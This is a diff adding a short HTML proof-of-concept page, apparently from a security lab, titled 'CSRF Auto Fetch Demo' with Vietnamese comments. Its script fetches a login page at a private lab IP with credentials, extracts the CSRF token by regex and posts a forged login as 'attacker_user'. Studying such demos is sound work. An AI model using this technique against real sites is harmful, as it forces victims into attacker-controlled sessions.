@@ -1,0 +1,57 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF Auto Fetch Demo</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    button { padding: 10px 20px; font-size: 16px; margin-bottom: 10px; }
+    pre { background: #f0f0f0; padding: 10px; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h2>CSRF Auto Fetch Demo</h2>
+
+  <button id="autoFetch">Send request tự động (có CSRF token)</button>
+
+  <pre id="output">Server response sẽ hiển thị ở đây.</pre>
+
+  <script>
+    const output = document.getElementById('output');
+
+    document.getElementById('autoFetch').addEventListener('click', async () => {
+      output.textContent = 'Đang lấy CSRF token từ login.php...';
+
+      try {
+        // 1. Lấy login.php HTML để trích token
+        const res = await fetch('http://192.168.33.10:8080/login.php', {
+          method: 'GET',
+          credentials: 'include'
+        });
+        const html = await res.text();
+
+        // 2. Dùng regex lấy value của csrf_token
+        const match = html.match(/name="csrf_token" value="([a-f0-9]+)"/);
+        if (!match) throw new Error('Không tìm thấy CSRF token trong HTML');
+
+        const csrfToken = match[1];
+        output.textContent = 'CSRF token lấy được: ' + csrfToken + '\nĐang gửi request POST...';
+
+        // 3. Gửi POST kèm CSRF token hợp lệ
+        const postRes = await fetch('http://192.168.33.10:8080/login.php', {
+          method: 'POST',
+          credentials: 'include',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: `username=attacker_user&password=attacker_pass&csrf_token=${csrfToken}&submit=submit`
+        });
+
+        const postData = await postRes.text();
+        output.textContent = 'Server response:\n' + postData;
+
+      } catch (err) {
+        output.textContent = 'Error:\n' + err;
+      }
+    });
+  </script>
+</body>
+</html>
